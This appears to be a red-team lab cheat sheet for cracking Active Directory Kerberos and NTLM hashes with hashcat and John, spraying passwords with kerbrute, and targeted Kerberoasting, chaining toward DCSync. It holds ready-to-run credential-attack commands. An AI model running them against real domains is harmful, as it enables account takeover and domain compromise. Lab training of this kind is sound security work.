# Hashcat / John / kerbrute (senior)

Crack in the lab. Do not spray Entra / smart-lockout tenants with this card.

## Modes

| What | Mode | Marker |
| --- | --- | --- |
| AS-REP | `18200` | `$krb5asrep$23$` |
| TGS RC4 | `13100` | `$krb5tgs$23$` |
| TGS AES128/256 | `19600` / `19700` | `$krb5tgs$17$` / `$18$` |
| NetNTLMv2 | `5600` | `user::domain:16hex:…` |
| NTLM | `1000` | 32 hex |
| NetNTLMv1 | `5500` | rare; often worth `-m 5500` if you see it (KPA) |

## Flags that matter

```
hashcat -m 18200 /loot/hashes/asrep.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 /loot/hashes/kerb.txt  /usr/share/wordlists/rockyou.txt
hashcat -m 19700 /loot/hashes/kerb-aes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 5600  /loot/hashes/netntlmv2.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000  /loot/hashes/ntlm.txt /usr/share/wordlists/rockyou.txt

# GOAD / known lab list first
hashcat -m 18200 asrep.txt /opt/gotad/conf/wordlist-lab.txt

# show
hashcat -m 18200 asrep.txt --show --outfile-format 3
```

John fallback (no GPU):

```
john --format=krb5asrep --wordlist=rockyou.txt asrep.txt
john --format=krb5tgs    --wordlist=rockyou.txt kerb.txt
john --show --format=krb5asrep asrep.txt
```

kerbrute (quieter than SMB spray; still lockout-capable):

```
kerbrute userenum --dc {{DC}} -d {{DOMAIN}} users.txt
kerbrute passwordspray --dc {{DC}} -d {{DOMAIN}} users.txt 'Welcome1'
# read pass-pol FIRST. cap attempts.
```

targetedKerberoast (only if BH says you can write a SPN):

```
targetedKerberoast.py -d {{DOMAIN}} -u {{USER}} -p '{{PASS}}' --dc-ip {{DC}} \
  -o /loot/hashes/targeted.txt
```

## Read this

- Pair the **username inside the hash** with the plaintext. Do not assign the first crack to the first file line.
- `Status: Exhausted` is a result. Keep the hash. Move to BloodHound.
- `sql_svc` on GOAD is intentionally hard. Stop burning GPU.

## Fail → next

| Symptom | Next |
| --- | --- |
| no GPU / `clGetPlatformIDs` | john, or `-D 1` (CPU). labs do not need a 4090 |
| AES TGS, 13100 empty | 19700/19600 |
| 5600 not cracking | relay the next handshake instead |
| kerbrute `KDC_ERR_CLIENT_REVOKED` | you locked it. stop |
| wordlist miss | rule `/usr/share/hashcat/rules/best64.rule` once, then quit |

## Chain

Hash → this card → nxc as that user → BloodHound. Never spray a cracked DA across the CIDR before you DCSync.
